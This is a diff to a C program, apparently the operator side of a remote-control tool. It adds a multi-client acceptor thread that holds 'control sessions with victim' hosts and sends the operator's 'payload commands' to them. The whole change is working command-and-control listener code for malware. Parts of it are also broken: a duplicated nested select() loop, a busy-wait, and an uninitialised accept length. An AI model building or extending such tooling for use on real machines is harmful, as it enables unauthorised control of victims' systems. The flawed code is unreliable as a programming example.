@@ -6,11 +6,22 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
-
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/time.h>
+#include <errno.h>
 #define MAXBUF 65536
 #define BACKLOG 1
 
+
+fd_set readfds;
+int master_socket, new_socket , client_socket[30] , max_clients = 30 , activity, i, sd;
+int max_sd;
+struct sockaddr_in cli;
+socklen_t len;
+
 // Declaration of struct "args" as the pthread_create function preferably takes a struct as a param
+// This is the struct for the Writer thread
 typedef struct args
 {
     int src;
@@ -18,7 +29,92 @@ typedef struct args
 } args;
 
 // Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
-void *Thread(void *arg)
+
+void *Acceptor(void *arg){
+
+		// assigned master socket to the set
+    FD_SET(master_socket, &readfds);
+
+		// sets array of socket fds to zero so not read 
+		for (i = 0; i < max_clients; i++) 
+		{
+			client_socket[i] = 0;
+		}
+
+		while(1){
+				
+				
+				FD_ZERO(&readfds);
+				FD_SET(master_socket, &readfds);
+				max_sd = master_socket;
+
+				//add child sockets to set
+				for ( i = 0 ; i < max_clients ; i++){
+	  		//socket descriptor
+				sd = client_socket[i];
+																			            
+				//if valid socket descriptor then add to read list
+				if(sd > 0)
+					FD_SET( sd , &readfds);
+																																			            
+				//highest file descriptor number, need it for the select function
+				if(sd > max_sd)
+					max_sd = sd;	  
+				}
+
+				
+				//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
+				activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
+		
+				if ((activity < 0) && (errno!=EINTR)) {
+			
+					printf("select error");
+			
+				}
+
+				if (FD_ISSET(master_socket, &readfds)) {
+				
+
+
+				//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
+				activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
+		
+				if ((activity < 0) && (errno!=EINTR)) {
+			
+				printf("select error");
+			
+				}
+
+				if (FD_ISSET(master_socket, &readfds)) {
+				
+					if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
+			
+						perror("accept");
+						exit(EXIT_FAILURE);
+			
+					}
+							
+					printf("Connection received - starting control session with victim %s\n", inet_ntoa(cli.sin_addr));
+					// add new socket to an array of sockets
+					
+					for (i = 0; i < max_clients; i++) {
+					
+						// only if position is empty
+						if( client_socket[i] == 0 ){
+						
+							client_socket[i] = new_socket;
+							printf("Adding as session %d\n" , i);
+								
+							break;
+						}
+					}
+				}
+			}
+		}
+	}
+
+
+void *Writer(void *arg)
 {
     
     args a = *(args *)arg;
@@ -105,42 +201,47 @@ int CreateServerSocket(char *address, char *port, int *type, int *family)
 
 void Server(char *address, char *port, int *type, int *family)
 {
-    int serverfd, clientfd, n;
+    args a;
+		int n;
     char buffer[MAXBUF];
     pthread_t printer;
-    socklen_t len;
-    struct sockaddr_storage cli;
+		pthread_t acceptor;
 
-    // calls function to create server socket then returns server file descriptor
-    serverfd = CreateServerSocket(address, port, type, family);
-    len = sizeof cli;
-    // uses accept function to accept socket connections, stores connection file descriptor in clientfd
-    if (*type == SOCK_STREAM && (clientfd = accept(serverfd, (struct sockaddr *)&cli, &len)) == -1)
-    {
-        printf("Error in function accept()\n");
-    }
-    
-    // Passes arguments to the thread struct
-    args a;
-    a.src = STDIN_FILENO;
-    a.dest = clientfd;
-    
-    struct sockaddr_in* pV4Addr = (struct sockaddr_in*)&cli;
-    struct in_addr ipAddr = pV4Addr->sin_addr;
+		// calls function to create server socket then returns server file descriptor
+		master_socket = CreateServerSocket(address, port, type, family);
 
-    char victim_address[INET_ADDRSTRLEN];
-    inet_ntop( AF_INET, &ipAddr, victim_address, INET_ADDRSTRLEN );
-    printf("Connection received - starting control session with victim %s\n", victim_address);
-    printf("Type \"help\" to see a list of payload commands\n");
-    
-    // creates thread that will run parallel with the rest of the code
-    if (pthread_create(&printer, NULL, Thread, (void *)&a) != 0)
+		// create an acceptor child process to accept incoming connections
+		
+		if (pthread_create(&acceptor, NULL, Acceptor, (void *)&a) != 0)
     {
         printf("Error in function pthread_create\n");
     }
-    // reads data from the victim socket, executes code is data is found
-    while ((n = read(clientfd, buffer, MAXBUF)) > 0)
+
+		// waits for the first socket to be filled
+		while(client_socket[0] == 0){
+		;;
+		}
+
+    // Passes arguments to the thread struct
+    a.src = STDIN_FILENO;
+		a.dest = client_socket[0];
+		printf("client fd is %i\n", a.dest); 
+
+
+ 		printf("Type \"help\" to see a list of payload commands\n");
+
+    // creates thread that will run parallel with the rest of the code to handle connection operations
+    if (pthread_create(&printer, NULL, Writer, (void *)&a) != 0)
     {
+        printf("Error in function pthread_create\n");
+    }
+   
+	  // reads data from the victim socket, executes code is data is found
+
+    read(a.dest, buffer, MAXBUF);
+    while ((n = read(a.dest, buffer, MAXBUF)) > 0)
+    {
+	
         if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
         {
             printf("Error in function write()\n");
@@ -151,13 +252,13 @@ void Server(char *address, char *port, int *type, int *family)
     {
         printf("Error in function read()\n");
     }
+
     // sends a request to stop thread
     pthread_cancel(printer);
     pthread_join(printer, NULL);
-
-    close(clientfd);
-    close(serverfd);
-
+		close(master_socket);
+    close(a.dest);
+		
 }
 
 
